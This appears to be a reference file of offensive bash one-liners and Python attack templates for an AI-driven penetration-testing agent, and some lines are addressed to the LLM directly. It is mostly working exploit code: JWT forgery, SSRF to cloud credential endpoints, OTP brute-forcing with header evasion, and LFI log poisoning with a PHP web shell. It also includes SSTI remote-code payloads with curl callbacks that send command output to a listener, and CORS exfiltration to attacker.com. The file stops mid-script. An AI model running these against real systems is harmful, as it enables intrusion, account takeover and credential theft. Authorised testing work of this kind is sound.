<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

## Advanced Scripts & One-Liners (Expert Reference)

These are complex bash one-liners and Python script templates. **DO NOT COPY THEM BLINDLY.** Adapt them to your specific target's logic.

### Bash One-Liners

**1. Extract and Resolve ASN to CIDRs:**
```bash
# Get ASN for an IP, extract CIDRs from BGP HE
ip_target="8.8.8.8"
asn=$(curl -s "https://ipinfo.io/$ip_target/json" | jq -r '.org' | grep -o 'AS[0-9]*')
curl -s "https://bgp.he.net/$asn#_prefixes" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]{1,2}' > output/cidrs.txt
```

**2. Extract JavaScript Endpoints parallelly:**
```bash
# Download JS files and extract endpoints using ripgrep
cat output/urls_all_deduped.txt | grep "\.js$" | parallel -j 20 "curl -sk {} | rg -o '(?<=["\'])(/[a-zA-Z0-9_/?=&.-]+)(?=["\'])' >> output/extracted_js_endpoints.txt"
sort -u output/extracted_js_endpoints.txt -o output/extracted_js_endpoints.txt
```

**3. Hidden Virtual Host Brute-Force (Wget/Curl):**
```bash
# Bypass WAF/Routing by testing internal VHosts
ip="192.168.1.100"
cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | parallel -j 50 "curl -s -o /dev/null -w '%{http_code} %{size_download} {}' -H 'Host: {}.target.internal' http://$ip" | grep -v "404\|403"
```

### Python Script Templates (Save in `tools/`)
**MANDATORY RULE:** ALL custom scripts (Python, Bash, etc.) MUST be created and saved in the `tools/` directory (e.g. `tools/exploit.py`). NEVER save scripts to the `output/` directory and NEVER save them to the root workspace.

**1. Race Condition — HTTP/2 Single-Packet Attack (Last-Byte Sync):**
```python
# tools/race_http2.py
# Requires: pip install httpx[http2] --break-system-packages
#
# HOW IT WORKS:
# HTTP/2 multiplexes all requests over ONE TCP connection.
# We warm the connection first, then fire all requests simultaneously.
# The server receives them in a single network packet — this is the
# equivalent of Burp Turbo Intruder's "single-packet attack".
#
# Use this for: coupon/voucher double-redeem, double-spend, quota bypass,
# OTP/token concurrent consumption, gift card abuse, inventory race.

import asyncio
import httpx
import json
import time

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_URL    = "https://target.com/api/v1/redeem_coupon"
SESSION_COOKIE = "session=YOUR_SESSION_COOKIE"
PAYLOAD        = json.dumps({"coupon_code": "FREE100"})
N_REQUESTS     = 20       # start low (10-20), scale if window is wide
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {
    "Content-Type": "application/json",
    "Cookie": SESSION_COOKIE,
    "Content-Length": str(len(PAYLOAD)),
}

async def race():
    async with httpx.AsyncClient(http2=True, verify=False, timeout=15.0) as client:
        # 1. Warm the connection — removes TLS/TCP handshake jitter
        try:
            await client.get(TARGET_URL, headers={"Cookie": SESSION_COOKIE})
            print(f"[*] Connection warmed → {TARGET_URL}")
        except Exception:
            pass

        # 2. Build all tasks before starting (minimize scheduling delay)
        tasks = [
            client.post(TARGET_URL, content=PAYLOAD, headers=HEADERS)
            for _ in range(N_REQUESTS)
        ]

        # 3. Fire simultaneously — single asyncio.gather = same event-loop tick
        start = time.perf_counter()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.perf_counter() - start

        # 4. Analyze results
        successes = []
        for i, r in enumerate(results):
            if isinstance(r, Exception):
                print(f"  [!] req {i:02d}: ERROR — {r}")
                continue
            marker = "[+] SUCCESS" if r.status_code == 200 else f"    [{r.status_code}]"
            print(f"  {marker} req {i:02d}: {len(r.text)}b — {r.text[:120]}")
            if r.status_code == 200 and "error" not in r.text.lower():
                successes.append(i)

        print(f"\n[*] {N_REQUESTS} requests in {elapsed:.3f}s")
        print(f"[*] Successes: {len(successes)} → req ids {successes}")
        if len(successes) > 1:
            print("[!!!] RACE CONDITION CONFIRMED — multiple successes for single-use resource!")

asyncio.run(race())
```

**1b. Race Condition — Broad Variant (aiohttp, HTTP/1.1, multi-session):**
```python
# tools/race_multiuser.py
# Use when: HTTP/2 not available, or testing cross-user races (different accounts)
# Each session = separate TCP connection = separate "user"
import asyncio, aiohttp, json, time

TARGET_URL = "https://target.com/api/v1/redeem_coupon"
SESSIONS = [
    {"Cookie": "session=ACCOUNT_1_COOKIE"},
    {"Cookie": "session=ACCOUNT_2_COOKIE"},
    # add more accounts for cross-user testing
]
PAYLOAD = {"coupon_code": "FREE100"}

async def send(session, headers):
    async with session.post(TARGET_URL, headers=headers, json=PAYLOAD) as r:
        text = await r.text()
        return r.status, text

async def race():
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [send(session, h) for h in SESSIONS * 5]  # 5 attempts per account
        start = time.perf_counter()
        results = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.perf_counter() - start

    successes = [(i, r) for i, r in enumerate(results)
                 if not isinstance(r, Exception) and r[0] == 200]
    print(f"[*] {len(tasks)} requests in {elapsed:.3f}s | Successes: {len(successes)}")
    for idx, (status, body) in successes:
        print(f"  [+] idx={idx} status={status} body={body[:100]}")

asyncio.run(race())
```

**2. Custom JWT Manipulator (Algorithm Confusion):**
```python
# tools/jwt_tamper.py
import jwt # PyJWT
import requests

# 1. Fetch public key of target
pub_key = requests.get("https://target.com/.well-known/jwks.json").text

# 2. Forge token using Public Key but signed as HMAC (HS256) instead of RSA (RS256)
header = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin", "role": "superuser"}

# Note: We use the PUBLIC KEY string as the HMAC secret
forged_token = jwt.encode(payload, pub_key, algorithm="HS256", headers=header)
print(f"Forged Token: {forged_token}")

# 3. Test the token
resp = requests.get("https://target.com/admin_dashboard", headers={"Cookie": f"session={forged_token}"})
print(resp.status_code)
```

**3. Bespoke Logic Fuzzer (JSON Mutation):**
```python
# tools/json_mutator.py
import requests
import json

base_url = "https://target.com/api/profile/update"
headers = {"Content-Type": "application/json"}
valid_payload = {"email": "test@test.com", "age": 25}

mutations = [
    {"email": {"$ne": "admin@target.com"}, "age": 25}, # NoSQL injection attempt
    {"email": ["test@test.com", "admin@target.com"], "age": 25}, # Array injection
    {"email": "test@test.com", "age": "25", "isAdmin": True}, # Mass assignment
    {"email": "test@test.com", "__proto__": {"isAdmin": True}} # Prototype pollution
]

for m in mutations:
    resp = requests.post(base_url, headers=headers, json=m)
    print(f"Payload: {json.dumps(m)} | Status: {resp.status_code} | Length: {len(resp.text)}")
```

**4. S3 Bucket Bruteforce (Parallel cURL):**
```bash
# Permute wordlists to find hidden S3 buckets for the target domain
target="company"
cat /usr/share/seclists/Discovery/Web-Content/common.txt | parallel -j 50 "curl -s -o /dev/null -w '%{http_code} {}' http://{}-${target}.s3.amazonaws.com" | grep -v 404
```

**5. Automated Bypassing of 403 Forbidden:**
```bash
# Try common bypass headers and path overrides on a 403 endpoint
url="https://target.com/admin"
headers=("X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-For: 127.0.0.1" "X-Custom-IP-Authorization: 127.0.0.1")
for h in "${headers[@]}"; do curl -s -o /dev/null -w "%{http_code} %{size_download} (Header: $h)
" -H "$h" "$url"; done
for p in "%2e/admin" "admin/." "//admin//" "admin%20" "%09admin"; do curl -s -o /dev/null -w "%{http_code} %{size_download} (Path: $p)
" "https://target.com/$p"; done
```

---

**4. Blind SSRF Pivoting & Cloud Metadata Extraction:**
```python
# tools/ssrf_pivot.py
import requests

target_url = "https://target.com/webhook/test?url="
# 169.254.169.254 is the AWS/GCP/Azure metadata IP. 0x0 is a bypass for localhost (127.0.0.1).
payloads = [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://0x0:80/",
    "http://127.0.0.1:22/",
    "http://localhost:6379/", # Redis
    "dict://127.0.0.1:11211/stat", # Memcached via dict protocol
    "gopher://127.0.0.1:3306/_" # MySQL via gopher
]

for payload in payloads:
    full_url = target_url + payload
    try:
        resp = requests.get(full_url, timeout=5)
        print(f"Payload: {payload} | Status: {resp.status_code} | Length: {len(resp.text)}")
        if "AccessKeyId" in resp.text or "redis_version" in resp.text:
            print(f"[!] Critical data found for {payload}:
{resp.text[:500]}")
    except requests.exceptions.RequestException as e:
        print(f"Payload: {payload} | Error: {e}")
```

**5. GraphQL Introspection & Mutation Extraction:**
```python
# tools/graphql_dumper.py
import requests
import json

graphql_url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

introspection_query = '''
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) { name }
}
'''
response = requests.post(graphql_url, headers=headers, json={"query": introspection_query})

if response.status_code == 200:
    schema = response.json()
    print("[+] Introspection Successful. Extracting Mutations...")
    for t in schema.get('data', {}).get('__schema', {}).get('types', []):
        if t.get('name') == 'Mutation': # Or Query
            for field in t.get('fields', []):
                print(f"  - {field['name']}")
    
    with open("output/graphql_schema_dump.json", "w") as f:
        json.dump(schema, f, indent=2)
else:
    print(f"[-] Introspection Failed. Status: {response.status_code}")
```

**6. Automated OAuth Flow Manipulation (State / CSRF Bypass):**
```python
# tools/oauth_tester.py
import requests

# Goal: Try to swap the 'state' or 'redirect_uri' in an OAuth initiation
init_url = "https://target.com/auth/oauth2/init"

# 1. Grab initial 302 redirect URL to the provider
resp = requests.get(init_url, allow_redirects=False)
if "Location" in resp.headers:
    oauth_url = resp.headers["Location"]
    print(f"[+] Found OAuth URL: {oauth_url}")
    
    # Example URL: https://provider.com/login?client_id=123&redirect_uri=https://target.com/callback&state=abc
    # Let's try to manipulate the redirect_uri to an attacker domain
    import urllib.parse
    parsed = urllib.parse.urlparse(oauth_url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if "redirect_uri" in params:
        original_uri = params["redirect_uri"][0]
        # Common Bypasses
        bypasses = [
            "https://attacker.com",
            f"{original_uri}@attacker.com",
            f"{original_uri}.attacker.com",
            original_uri.replace("https://", "http://"),
            original_uri + "%0d%0aHeader-Injection: test"
        ]
        
        for b in bypasses:
            new_params = params.copy()
            new_params["redirect_uri"] = b
            encoded_query = urllib.parse.urlencode(new_params, doseq=True)
            test_url = parsed._replace(query=encoded_query).geturl()
            print(f"[*] Testing manipulated redirect_uri: {b}")
            # In a real scenario, you'd feed this manipulated URL to a browser instance and see if the provider accepts it
            # and redirects back to the attacker domain.
```

**7. WebSocket Cross-Site Hijacking (CSWSH) & Fuzzing:**
```python
# tools/websocket_fuzzer.py
import asyncio
import websockets
import json

ws_url = "wss://target.com/socket.io/?EIO=4&transport=websocket"
# If the WS endpoint doesn't check Origin or use CSRF tokens during handshake, it's vulnerable to CSWSH.
headers = {"Origin": "https://attacker.com", "Cookie": "session=YOUR_VALID_COOKIE_HERE"}

async def test_ws():
    try:
        async with websockets.connect(ws_url, extra_headers=headers) as websocket:
            print("[+] Connected successfully with attacker Origin! (Potential CSWSH)")
            
            # Fuzzing incoming message handlers
            payloads = [
                "42[\"admin_action\", {\"action\": \"delete_all\"}]", # Socket.IO format
                json.dumps({"type": "auth", "token": "../../../etc/passwd"}), # Path traversal in token?
                json.dumps({"type": "message", "__proto__": {"isAdmin": True}}) # Prototype pollution via WS
            ]
            
            for p in payloads:
                print(f"[*] Sending: {p}")
                await websocket.send(p)
                try:
                    # Wait for a brief moment for a response
                    response = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                    print(f"[<] Received: {response}")
                except asyncio.TimeoutError:
                    print(f"[-] No response for {p}")
                    
    except Exception as e:
        print(f"[-] Connection failed: {e}")

asyncio.run(test_ws())
```

**8. Blind Deserialization / Object Injection Tester:**
```python
# tools/deserialization_tester.py
import requests
import base64
import urllib.parse

url = "https://target.com/api/user/prefs"
# Testing common sinks like Java (AC ED 00 05), PHP (O:), Python Pickle (cos), .NET (AAEAAAD//)
# We use a pingback/OOB listener like interactsh or burp collaborator to catch blind execution
collab_url = "http://YOUR_OOB_LISTENER.com"

# Example: Simple PHP Object Injection checking for magic method __destruct triggers
php_payload = f'O:14:"MessageLogger":1:{{s:8:"log_file";s:{len(collab_url)+10}:"http://{collab_url}";}}'
b64_php = base64.b64encode(php_payload.encode()).decode()

test_cases = [
    {"Cookie": f"prefs={urllib.parse.quote(php_payload)}"},
    {"Cookie": f"prefs={b64_php}"}
]

for headers in test_cases:
    print(f"[*] Testing headers: {headers}")
    try:
        requests.get(url, headers=headers, timeout=5)
    except:
        pass
print("[!] Check your OOB listener now.")

# Note for LLM: If you suspect Java, generate payloads using 'ysoserial'.
# Example: 
# java -jar ysoserial.jar CommonsCollections4 "curl http://YOUR_OOB_LISTENER" > payload.bin
# base64 payload.bin > payload.b64
```

**9. Advanced 2FA / OTP Bypass via Response Manipulation & Rate Limit Evasion:**
```python
# tools/otp_bypass.py
import requests
from concurrent.futures import ThreadPoolExecutor

base_url = "https://target.com/api/auth/verify_otp"
phone_number = "+1234567890"

def try_otp(otp_code):
    # Evasion techniques:
    # 1. Append null bytes or random chars
    # 2. IP Rotation via X-Forwarded-For
    headers = {
        "X-Forwarded-For": f"203.0.113.{otp_code % 255}",
        "Content-Type": "application/json" 
    }
    
    # Logic flaws to test:
    # - Arrays instead of strings: {"otp": ["1234", "0000"]}
    # - Missing parameters
    # - Sending successful response artificially (if client-side verification is used)
    
    payload = {"phone": phone_number, "otp": str(otp_code).zfill(4)}
    
    try:
        resp = requests.post(base_url, json=payload, headers=headers, timeout=3)
        if resp.status_code == 200 and "invalid" not in resp.text.lower():
            print(f"[+] Possible bypass with OTP: {otp_code} | Resp: {resp.text}")
            return True
    except:
        pass
    return False

# Test a small range or use a logical bypass (e.g., testing 0000, 1111, or forcing an error)
# For full bruteforce, use ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=50) as executor:
    # Testing 0000 to 9999
    results = executor.map(try_otp, range(10000))
```

**10. Advanced CORS Misconfiguration Exploit Generator:**
```python
# tools/cors_exploit.py
# Generates an HTML payload to prove a CORS misconfiguration (e.g., origin reflection + credentials=true)
target_endpoint = "https://target.com/api/user/private_data"

html_payload = f'''
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
    <h2>CORS Exploit against {target_endpoint}</h2>
    <textarea id="output" style="width: 100%; height: 300px;"></textarea>
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open("GET", "{target_endpoint}", true);
        // CRITICAL: withCredentials must be true to steal authenticated session data
        req.withCredentials = true; 
        req.send();

        function reqListener() {{
            document.getElementById("output").value = this.responseText;
            // Exfiltrate to attacker server
            // fetch("https://attacker.com/log?data=" + btoa(this.responseText));
        }}
    </script>
</body>
</html>
'''

with open("output/cors_poc.html", "w") as f:
    f.write(html_payload)
print("[+] Wrote output/cors_poc.html. Host this locally and open in a browser authenticated to the target to verify.")
```

**11. Advanced Local File Inclusion (LFI) to RCE Pipeline:**
```bash
# Bash One-Liner Pipeline for LFI escalation
target="https://target.com/download?file="

# 1. Try to read /etc/passwd using various encodings and depth
for depth in {1..8}; do
    traverse=$(printf "../"%.0s $(seq 1 $depth))
    curl -s "${target}${traverse}etc/passwd" | grep -q "root:x" && echo "[+] Vulnerable depth: $depth (${traverse}etc/passwd)"
done

# 2. If vulnerable, attempt to read log files to poison them (LFI -> RCE)
# Common log locations: /var/log/nginx/access.log, /var/log/apache2/access.log, /proc/self/environ, /var/log/auth.log
# Example: Injecting PHP payload into User-Agent, then reading the log file
curl -s -A "<?php system(\$_GET['cmd']); ?>" "https://target.com/"
curl -s "${target}../../../../../../var/log/nginx/access.log&cmd=id" | grep "uid="
```

---

## Recon Scripts

**12. JavaScript Deep Secret Extractor:**
```python
# tools/js_secret_extractor.py
# Downloads ALL JS files from target, scans for secrets, internal endpoints, and API schemas.
# Requires: pip install httpx[http2] --break-system-packages
#
# HOW IT WORKS:
# 1. Reads JS URLs from output/urls_all_deduped.txt (from katana/gospider/gau)
# 2. Fetches all JS files concurrently (HTTP/2)
# 3. Runs 30+ regex patterns against each file
# 4. Outputs findings sorted by severity to output/js_secrets.txt

import asyncio, httpx, re, json
from pathlib import Path

JS_URLS_FILE  = "output/urls_all_deduped.txt"
OUTPUT_FILE   = "output/js_secrets.txt"
SESSION_COOKIE = ""  # Optional: "session=VALUE" for auth-gated JS

PATTERNS = {
    # Cloud / infra credentials
    "AWS_AccessKey":     r"AKIA[0-9A-Z]{16}",
    "AWS_SecretKey":     r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]",
    "GCP_ServiceAccount":r"\"type\":\s*\"service_account\"",
    "Azure_ClientSecret":r"(?i)azure.{0,30}client.{0,10}secret.{0,10}['\"][a-zA-Z0-9~_.\-]{34,}['\"]",
    # API keys
    "Generic_ApiKey":    r"(?i)(api[_-]?key|apikey|api[_-]?secret)['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_\-]{20,}['\"]",
    "Stripe_Key":        r"(?:r|s)k_(?:live|test)_[0-9a-zA-Z]{24,}",
    "Twilio_SID":        r"AC[a-zA-Z0-9]{32}",
    "Slack_Token":       r"xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,}",
    "GitHub_Token":      r"gh[pousr]_[A-Za-z0-9_]{36,}",
    "SendGrid_Key":      r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}",
    "Firebase_Key":      r"AIza[0-9A-Za-z\-_]{35}",
    # Auth secrets
    "JWT_Secret_Hint":   r"(?i)(jwt|token)[_-]?secret['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
    "Password_In_Code":  r"(?i)(password|passwd|pwd)['\"]?\s*[:=]\s*['\"][^'\"]{6,}['\"]",
    "Basic_Auth_URL":    r"https?://[^:]+:[^@]+@[a-zA-Z0-9.\-]+",
    # Internal endpoints
    "Internal_IP":       r"(?:https?://)?(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d+\.\d+(?::\d+)?(?:/[^\s'\"]*)?",
    "Localhost_Endpoint":r"(?:https?://)?localhost(?::\d+)?/[^\s'\"]+",
    "Internal_API_Path": r"['\"](?:/(?:internal|admin|debug|metrics|actuator|health|management|v\d+/internal)[/a-zA-Z0-9_\-?=&]*)['\"]",
    "GraphQL_Endpoint":  r"['\"](?:/graphql|/gql|/api/graphql)['\"]",
    # S3 / storage
    "S3_Bucket":         r"[a-z0-9.\-]{3,63}\.s3(?:[.-][a-z0-9-]+)?\.amazonaws\.com",
    "GCS_Bucket":        r"storage\.googleapis\.com/[a-zA-Z0-9_\-]+",
    # Debug / dev artifacts
    "Debug_Flag":        r"(?i)(debug|devMode|isDev|isLocal|enableLogging)\s*[:=]\s*true",
    "Hardcoded_UUID":    r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
    "TODO_FIXME":        r"(?i)(?:TODO|FIXME|HACK|XXX):?\s*.{10,80}",
    # Crypto hints
    "RSA_Private_Key":   r"-----BEGIN (?:RSA )?PRIVATE KEY-----",
    "Private_Key_Hint":  r"(?i)private[_-]?key['\"]?\s*[:=]\s*['\"](?!null)[^'\"]{10,}['\"]",
}

async def fetch_js(client: httpx.AsyncClient, url: str) -> tuple[str, str]:
    try:
        headers = {"Cookie": SESSION_COOKIE} if SESSION_COOKIE else {}
        r = await client.get(url.strip(), headers=headers, timeout=10.0,
                             follow_redirects=True)
        if "javascript" in r.headers.get("content-type", "") or url.endswith(".js"):
            return url, r.text
    except Exception:
        pass
    return url, ""

async def main():
    js_urls = [u for u in Path(JS_URLS_FILE).read_text().splitlines()
               if u.strip() and (".js" in u or "bundle" in u or "chunk" in u)]
    print(f"[*] Scanning {len(js_urls)} JS files...")

    findings: list[dict] = []
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [fetch_js(client, u) for u in js_urls]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    for url, content in results:
        if not content:
            continue
        for pattern_name, regex in PATTERNS.items():
            for match in re.finditer(regex, content):
                findings.append({
                    "pattern": pattern_name,
                    "url": url,
                    "match": match.group()[:200],
                    "line": content[:match.start()].count("\n") + 1,
                })

    # Sort: cloud/auth keys first
    priority = ["AWS", "GCP", "Azure", "JWT", "Password", "RSA", "Private"]
    findings.sort(key=lambda f: not any(p in f["pattern"] for p in priority))

    with open(OUTPUT_FILE, "w") as out:
        for f in findings:
            line = f"[{f['pattern']}] {f['url']}:{f['line']} → {f['match']}\n"
            out.write(line)
            print(line.strip())

    print(f"\n[*] {len(findings)} findings → {OUTPUT_FILE}")

asyncio.run(main())
```

**13. IDOR Sequential Scanner (Diff-Based):**
```python
# tools/idor_scanner.py
# Scans a range of object IDs as an authenticated user and compares response sizes.
# Baseline = your own resource. Different size = IDOR candidate.
#
# HOW IT WORKS:
# 1. Fetch your own object (YOUR_ID) → establish baseline length
# 2. Fetch IDs in range [START..END] using your session
# 3. If response length differs from baseline (not 403/404) → flag as IDOR
# 4. Save flagged IDs for manual verification

import asyncio, httpx, json
from pathlib import Path

# ── CONFIG ──────────────────────────────────────────────────────────────────
BASE_URL       = "https://target.com/api/v1/users/{id}/profile"
SESSION_COOKIE = "session=YOUR_COOKIE"
YOUR_ID        = 1000          # Your own object ID (establishes baseline)
ID_START       = 990
ID_END         = 1010
CONCURRENCY    = 10            # Parallel requests — keep low to avoid rate-limits
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {"Cookie": SESSION_COOKIE, "Accept": "application/json"}

async def fetch(client: httpx.AsyncClient, obj_id: int) -> dict:
    url = BASE_URL.format(id=obj_id)
    try:
        r = await client.get(url, headers=HEADERS, timeout=8.0)
        return {"id": obj_id, "status": r.status_code, "len": len(r.text), "body": r.text[:300]}
    except Exception as e:
        return {"id": obj_id, "status": -1, "len": 0, "body": str(e)}

async def main():
    semaphore = asyncio.Semaphore(CONCURRENCY)
    async def bounded(client, oid):
        async with semaphore:
            return await fetch(client, oid)

    async with httpx.AsyncClient(http2=True, verify=False) as client:
        # Establish baseline
        baseline = await fetch(client, YOUR_ID)
        print(f"[*] Baseline (id={YOUR_ID}): status={baseline['status']} len={baseline['len']}")

        ids = list(range(ID_START, ID_END + 1))
        tasks = [bounded(client, oid) for oid in ids if oid != YOUR_ID]
        results = await asyncio.gather(*tasks)

    idor_candidates = []
    for r in results:
        if r["status"] in (200, 201) and abs(r["len"] - baseline["len"]) < 500:
            # Same shape as your own object → likely readable → IDOR
            idor_candidates.append(r)
            print(f"  [!!!] IDOR CANDIDATE id={r['id']} status={r['status']} len={r['len']}")
            print(f"        {r['body'][:150]}")
        elif r["status"] not in (401, 403, 404, -1):
            print(f"  [?]  id={r['id']} status={r['status']} len={r['len']} (unexpected, verify manually)")

    out = Path("output/idor_candidates.json")
    out.write_text(json.dumps(idor_candidates, indent=2))
    print(f"\n[*] {len(idor_candidates)} IDOR candidates → {out}")

asyncio.run(main())
```

**14. Subdomain Takeover Fingerprint Checker:**
```python
# tools/takeover_checker.py
# For each subdomain, resolves CNAME chain and checks if the final destination
# matches known dangling fingerprints (404 pages from Heroku, GitHub Pages, etc.)
# Run AFTER subfinder/amass: reads output/subdomains.txt
#
# Requires: pip install dnspython httpx --break-system-packages

import asyncio, httpx, dns.resolver, json
from pathlib import Path

SUBDOMAINS_FILE = "output/subdomains.txt"
OUTPUT_FILE     = "output/takeover_candidates.txt"

# Fingerprints: service name → substring that appears in the dangling 404 page
FINGERPRINTS = {
    "GitHub Pages":   ["There isn't a GitHub Pages site here", "For root URLs"],
    "Heroku":         ["No such app", "herokucdn.com/error-pages"],
    "Netlify":        ["Not Found - Request ID"],
    "Fastly":         ["Fastly error: unknown domain"],
    "Shopify":        ["Sorry, this shop is currently unavailable"],
    "Tumblr":         ["Whatever you were looking for doesn't live here"],
    "Squarespace":    ["This domain is not set up on Squarespace"],
    "WP Engine":      ["The site you were looking for couldn't be found"],
    "Surge.sh":       ["project not found"],
    "Readme.io":      ["Project doesnt exist... yet!"],
    "Zendesk":        ["Help Center Closed"],
    "AWS S3":         ["NoSuchBucket", "The specified bucket does not exist"],
    "AWS CloudFront": ["The request could not be satisfied", "CloudFront"],
    "Azure":          ["404 Web Site not found"],
    "Fly.io":         ["404 Not Found"],
    "Vercel":         ["The deployment could not be found"],
}

def resolve_cname(domain: str) -> str | None:
    try:
        answers = dns.resolver.resolve(domain, "CNAME")
        return str(answers[0].target).rstrip(".")
    except Exception:
        return None

async def check(client: httpx.AsyncClient, subdomain: str) -> dict | None:
    subdomain = subdomain.strip()
    if not subdomain:
        return None
    cname = resolve_cname(subdomain)
    for scheme in ("https", "http"):
        try:
            r = await client.get(f"{scheme}://{subdomain}", timeout=6.0, follow_redirects=True)
            body = r.text
            for service, fingerprints in FINGERPRINTS.items():
                if any(fp in body for fp in fingerprints):
                    return {"subdomain": subdomain, "cname": cname,
                            "service": service, "status": r.status_code}
        except Exception:
            pass
    return None

async def main():
    subdomains = Path(SUBDOMAINS_FILE).read_text().splitlines()
    print(f"[*] Checking {len(subdomains)} subdomains for takeover...")

    results = []
    async with httpx.AsyncClient(verify=False, http2=True) as client:
        tasks = [check(client, s) for s in subdomains]
        for coro in asyncio.as_completed(tasks):
            r = await coro
            if r:
                results.append(r)
                print(f"  [!!!] TAKEOVER: {r['subdomain']} → {r['service']} (CNAME: {r['cname']})")

    Path(OUTPUT_FILE).write_text("\n".join(
        f"{r['subdomain']} | {r['service']} | CNAME={r['cname']}" for r in results
    ))
    print(f"[*] {len(results)} takeover candidates → {OUTPUT_FILE}")

asyncio.run(main())
```

---

## Advanced Exploit Scripts

**15. SSTI Auto-Fingerprint & Data Extraction:**
```python
# tools/ssti_exploit.py
# Detects Server-Side Template Injection and identifies the template engine.
# Then extracts OS-level data using engine-specific payloads.
#
# HOW IT WORKS:
# 1. Inject math expressions that different engines evaluate differently
# 2. Fingerprint engine from evaluated result
# 3. Use engine-specific RCE payload to extract /etc/passwd or run id
# 4. Verify with OOB callback if response is blind

import requests, urllib.parse, re

# ── CONFIG ──────────────────────────────────────────────────────────────────
TARGET_URL     = "https://target.com/api/search"
PARAM          = "q"           # Parameter to inject into
METHOD         = "GET"         # GET or POST
SESSION_COOKIE = "session=VALUE"
OOB_HOST       = "YOUR.interactsh.com"  # For blind SSTI
# ────────────────────────────────────────────────────────────────────────────

HEADERS = {"Cookie": SESSION_COOKIE, "Content-Type": "application/x-www-form-urlencoded"}

# Phase 1: Engine fingerprint probes
# Math expression → expected output per engine
FINGERPRINT_PROBES = [
    ("{{7*7}}",          "49",   "Jinja2 / Twig / Smarty"),
    ("${7*7}",           "49",   "FreeMarker / Thymeleaf / Java EL"),
    ("#{7*7}",           "49",   "Ruby ERB / Groovy"),
    ("<%= 7*7 %>",       "49",   "Ruby ERB"),
    ("{{7*'7'}}",        "7777777", "Jinja2 (Python)"),
    ("${{<%[%'\"}}%\\.", None,  "WAF/parser confusion probe"),
]

# Phase 2: Engine-specific RCE payloads
RCE_PAYLOADS = {
    "Jinja2 (Python)": [
        "{{''.__class__.__mro__[1].__subclasses__()[401](['id'],stdout=-1).communicate()[0].decode()}}",
        # Safer: read /etc/passwd
        "{{''.__class__.__mro__[1].__subclasses__()[401](['cat','/etc/passwd'],stdout=-1).communicate()[0].decode()}}",
    ],
    "FreeMarker / Thymeleaf / Java EL": [
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "Twig (PHP)": [
        "{{['id']|map('system')|join}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
    "Smarty (PHP)": [
        "{php}echo shell_exec('id');{/php}",
        "{$smarty.template_object->smarty->_tpl_vars}",
    ],
    "Ruby ERB": [
        "<%= `id` %>",
        "<%= IO.popen('id').read %>",
    ],
}

OOB_PAYLOADS = {
    "Jinja2 (Python)": f"{{{{''.__class__.__mro__[1].__subclasses__()[401](['curl','http://{OOB_HOST}/?d=$(id|base64)'],stdout=-1).communicate()}}}}",
    "FreeMarker / Thymeleaf / Java EL": f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("curl http://{OOB_HOST}/?d=$(id|base64)")}}',
}

def send(payload: str) -> str:
    encoded = urllib.parse.quote(payload)
    try:
        if METHOD == "GET":
            r = requests.get(f"{TARGET_URL}?{PARAM}={encoded}",
                             headers=HEADERS, timeout=8, verify=False)
        else:
            r = requests.post(TARGET_URL, data={PARAM: payload},
                              headers=HEADERS, timeout=8, verify=False)
        return r.text
    except Exception as e:
        return str(e)

def main():
    engine = None

    # Phase 1: Fingerprint
    print("[*] Phase 1: Fingerprinting template engine...")
    for probe, expected, label in FINGERPRINT_PROBES:
        body = send(probe)
        if expected and expected in body:
            engine = label
            print(f"  [+] Engine detected: {engine} (probe: {probe!r} → found {expected!r})")
            break
        elif expected is None and probe[:5] in body:
            print(f"  [?] Parser confusion response for {probe!r} — review manually")

    if not engine:
        print("  [-] No engine fingerprinted. Try OOB probes or manual payloads.")
        return

    # Phase 2: RCE
    print(f"\n[*] Phase 2: RCE via {engine}...")
    payloads = RCE_PAYLOADS.get(engine, [])
    for payload in payloads:
        body = send(payload)
        uid_match = re.search(r"uid=\d+\([^)]+\)", body)
        if uid_match:
            print(f"  [!!!] RCE CONFIRMED: {uid_match.group()}")
            print(f"  Payload: {payload}")
            break
        elif "root:" in body or ":/bin/bash" in body:
            print(f"  [!!!] /etc/passwd read confirmed via {payload[:60]}")
            break
    else:
        # Phase 3: Blind OOB
        print(f"\n[*] Phase 3: Blind OOB for {engine}...")
        oob = OOB_PAYLOADS.get(engine)
        if oob:
            send(oob)
